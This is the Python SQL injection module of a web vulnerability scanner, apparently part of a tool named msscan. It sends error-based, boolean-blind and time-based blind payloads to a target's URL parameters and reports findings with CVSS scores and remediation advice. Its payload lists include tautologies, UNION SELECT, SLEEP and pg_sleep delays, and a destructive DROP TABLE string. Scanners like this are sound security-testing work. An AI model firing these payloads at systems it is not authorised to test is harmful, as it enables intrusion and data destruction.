"""SQL Injection scanner — error-based, boolean-based blind, and time-based blind."""

from __future__ import annotations

import re
import time
from typing import AsyncIterator

from msscan.core.context import ScanContext
from msscan.core.events import ScanEvent, FindingEvent, ProgressEvent
from msscan.core.result import ScanResult
from msscan.scanners.base import BaseScanner
from msscan.utils.helpers import inject_param, extract_params
from msscan.utils.payloads import load_payloads

_REMEDIATION = "Use parameterized queries / prepared statements instead of string concatenation"

_CVSS_ERROR_BASED = (
    9.8,
    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
)
_CVSS_BLIND = (
    7.5,
    "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
)

# SQL error message patterns (all evaluated as regex via re.search)
SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax",
    r"warning: mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"microsoft ole db provider for sql server",
    r"microsoft ole db provider for odbc drivers",
    r"syntax error in string in query expression",
    r"pg_query\(\):",
    r"pg_exec\(\):",
    r"psqlexception",
    r"ora-01756",
    r"ora-00933",
    r"sqlite3\.operationalerror",
    r"sqliteexception",
    r"jdbc\.sqltransientconnectionexception",
    r"sql syntax.*mysql",
    r"valid mysql result",
    r"postgresql.*error",
    r"warning.*pg_",
    r"driver.* sql",
    # MariaDB
    r"mariadb server version",
    # CockroachDB
    r"cockroachdb",
    # DB2
    r"db2 sql error",
    # Firebird
    r"dynamic sql error.*firebird",
    # Microsoft SQL Server
    r"microsoft sql server",
    # Generic SQLSTATE
    r"sqlstate\[",
]

# Pre-compile patterns for performance
_COMPILED_PATTERNS = [(p, re.compile(p, re.IGNORECASE)) for p in SQL_ERROR_PATTERNS]


class Scanner(BaseScanner):
    name = "sqli"
    description = "SQL injection scanner for error, boolean, and time-based techniques."
    author = "msscan"

    @property
    def version(self) -> str:
        return "1.1"

    async def scan(self, ctx: ScanContext) -> AsyncIterator[ScanEvent]:
        payloads = load_payloads("sqli.txt")
        if not payloads:
            payloads = self._default_payloads()

        params = extract_params(ctx.target)
        if not params:
            params = {p: ["1"] for p in ["id", "page", "cat", "item", "user", "product"]}

        param_names = list(params.keys())
        total_params = len(param_names)

        for param_idx, param_name in enumerate(param_names):
            if ctx.is_cancelled:
                return

            # 1. Error-based SQLi
            error_findings = await self._test_error_based(
                ctx.target, param_name, payloads, ctx,
            )
            found = len(error_findings) > 0
            for finding in error_findings:
                yield FindingEvent(result=finding)

            # 2. Boolean-based blind SQLi (only if error-based was not found)
            if not found:
                if ctx.is_cancelled:
                    return
                boolean_findings = await self._test_boolean_based(
                    ctx.target, param_name, ctx,
                )
                found = len(boolean_findings) > 0
                for finding in boolean_findings:
                    yield FindingEvent(result=finding)

            # 3. Time-based blind SQLi (only if neither was found)
            if not found:
                if ctx.is_cancelled:
                    return
                time_findings = await self._test_time_based(
                    ctx.target, param_name, ctx,
                )
                for finding in time_findings:
                    yield FindingEvent(result=finding)

            yield ProgressEvent(
                scanner_name=self.name,
                current=param_idx + 1,
                total=total_params,
                message=f"Tested parameter '{param_name}'",
            )

    async def _test_error_based(
        self, url: str, param: str, payloads: list[str],
        ctx: ScanContext,
    ) -> list[ScanResult]:
        for payload in payloads:
            if ctx.is_cancelled:
                return []
            test_url = inject_param(url, param, payload)
            try:
                resp = await ctx.client.get(test_url)
                body = resp.text.lower()

                for raw_pattern, compiled in _COMPILED_PATTERNS:
                    if compiled.search(body):
                        return [ScanResult(
                            scanner=self.name,
                            severity="CRITICAL",
                            url=test_url,
                            detail=f"Error-based SQLi — SQL error in '{param}' parameter",
                            evidence=f"Pattern: {raw_pattern} | Payload: {payload}",
                            confidence="HIGH",
                            confidence_score=0.95,
                            cvss_score=_CVSS_ERROR_BASED[0],
                            cvss_vector=_CVSS_ERROR_BASED[1],
                            exploit_scenario=(
                                f"An attacker can inject SQL via '{param}' to read or modify data."
                            ),
                            remediation=_REMEDIATION,
                            cwe_id="CWE-89",
                        )]
            except Exception:
                continue
        return []

    async def _test_boolean_based(
        self, url: str, param: str,
        ctx: ScanContext,
    ) -> list[ScanResult]:
        true_payload = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"
        # Benign payload with original parameter value for baseline comparison
        benign_payload = "1"

        true_url = inject_param(url, param, true_payload)
        false_url = inject_param(url, param, false_payload)
        benign_url = inject_param(url, param, benign_payload)

        try:
            # Fetch responses for all three: benign baseline, true, false
            benign_resp = await ctx.client.get(benign_url)
            true_resp = await ctx.client.get(true_url)
            false_resp = await ctx.client.get(false_url)

            benign_len = len(benign_resp.text)
            true_len = len(true_resp.text)
            false_len = len(false_resp.text)
            diff = abs(true_len - false_len)

            # For dynamic pages, compare both true and false against benign baseline
            # instead of just comparing true vs false.
            benign_diff_true = abs(true_len - benign_len)
            benign_diff_false = abs(false_len - benign_len)

            max_len = max(true_len, false_len, benign_len, 1)
            pct_diff = diff / max_len
            pct_diff_benign_true = benign_diff_true / max_len
            pct_diff_benign_false = benign_diff_false / max_len

            # Flag if: (1) true/false differ significantly AND (2) both differ from benign
            # This avoids false positives where the page is just variable-length
            if (diff > 200 or pct_diff > 0.10) and (
                pct_diff_benign_true > 0.05 or pct_diff_benign_false > 0.05
            ):
                return [ScanResult(
                    scanner=self.name,
                    severity="HIGH",
                    url=true_url,
                    detail=f"Boolean-based Blind SQLi — response length difference in '{param}' parameter",
                    evidence=(
                        f"Benign length: {benign_len} | "
                        f"True condition length: {true_len} | "
                        f"False condition length: {false_len} | "
                        f"Difference: {diff} ({pct_diff:.1%})"
                    ),
                    confidence="MEDIUM",
                    confidence_score=0.5,
                    cvss_score=_CVSS_BLIND[0],
                    cvss_vector=_CVSS_BLIND[1],
                    exploit_scenario=(
                        f"An attacker can infer database responses via '{param}' and extract data."
                    ),
                    remediation=_REMEDIATION,
                    cwe_id="CWE-89",
                )]
        except Exception:
            pass

        return []

    async def _test_time_based(
        self, url: str, param: str,
        ctx: ScanContext,
    ) -> list[ScanResult]:
        # Measure baseline response time from 3 benign requests
        baselines: list[float] = []
        for _ in range(3):
            if ctx.is_cancelled:
                return []
            try:
                t0 = time.monotonic()
                await ctx.client.get(url)
                baselines.append(time.monotonic() - t0)
            except Exception:
                continue

        if baselines:
            avg_baseline = sum(baselines) / len(baselines)
        else:
            avg_baseline = 0.0

        threshold = avg_baseline + 2.5

        time_payloads = [
            "1' AND SLEEP(3)--",
            "1' AND SLEEP(3)#",
            "1; WAITFOR DELAY '0:0:3'--",
            "1' OR SLEEP(3)--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
            "1' AND pg_sleep(3)--",
            "1; SELECT pg_sleep(3)--",
        ]
        for payload in time_payloads:
            if ctx.is_cancelled:
                return []
            test_url = inject_param(url, param, payload)
            try:
                t0 = time.monotonic()
                await ctx.client.get(test_url)
                elapsed = time.monotonic() - t0

                if elapsed >= threshold:
                    # Confirmation: send a benign request to verify the delay was real
                    # and not just network jitter. If benign request is fast, the SQLi
                    # finding is more credible.
                    confirmation_url = inject_param(url, param, "1")
                    try:
                        t_confirm = time.monotonic()
                        await ctx.client.get(confirmation_url)
                        confirm_elapsed = time.monotonic() - t_confirm

                        # If confirmation is fast (< avg_baseline * 1.5), the original delay
                        # is likely real and not just network slowness.
                        if confirm_elapsed < (avg_baseline * 1.5):
                            return [ScanResult(
                                scanner=self.name,
                                severity="HIGH",
                                url=test_url,
                                detail=f"Time-based Blind SQLi — {elapsed:.1f}s delay in '{param}' parameter",
                                evidence=(
                                    f"Payload: {payload} | Duration: {elapsed:.1f}s | "
                                    f"Baseline: {avg_baseline:.2f}s | Threshold: {threshold:.2f}s | "
                                    f"Confirmation (benign): {confirm_elapsed:.2f}s"
                                ),
                                confidence="MEDIUM",
                                confidence_score=0.6,
                                cvss_score=_CVSS_BLIND[0],
                                cvss_vector=_CVSS_BLIND[1],
                                exploit_scenario=(
                                    f"An attacker can delay responses via '{param}' to infer data."
                                ),
                                remediation=_REMEDIATION,
                                cwe_id="CWE-89",
                            )]
                    except Exception:
                        # If confirmation request fails, still emit finding based on elapsed time
                        return [ScanResult(
                            scanner=self.name,
                            severity="HIGH",
                            url=test_url,
                            detail=f"Time-based Blind SQLi — {elapsed:.1f}s delay in '{param}' parameter",
                            evidence=(
                                f"Payload: {payload} | Duration: {elapsed:.1f}s | "
                                f"Baseline: {avg_baseline:.2f}s | Threshold: {threshold:.2f}s"
                            ),
                            confidence="MEDIUM",
                            confidence_score=0.6,
                            cvss_score=_CVSS_BLIND[0],
                            cvss_vector=_CVSS_BLIND[1],
                            exploit_scenario=(
                                f"An attacker can delay responses via '{param}' to infer data."
                            ),
                            remediation=_REMEDIATION,
                            cwe_id="CWE-89",
                        )]
            except Exception:
                continue

        return []

    @staticmethod
    def _default_payloads() -> list[str]:
        return [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "1' ORDER BY 1--",
            "1 UNION SELECT NULL--",
            "') OR ('1'='1",
            "'; DROP TABLE test--",
        ]
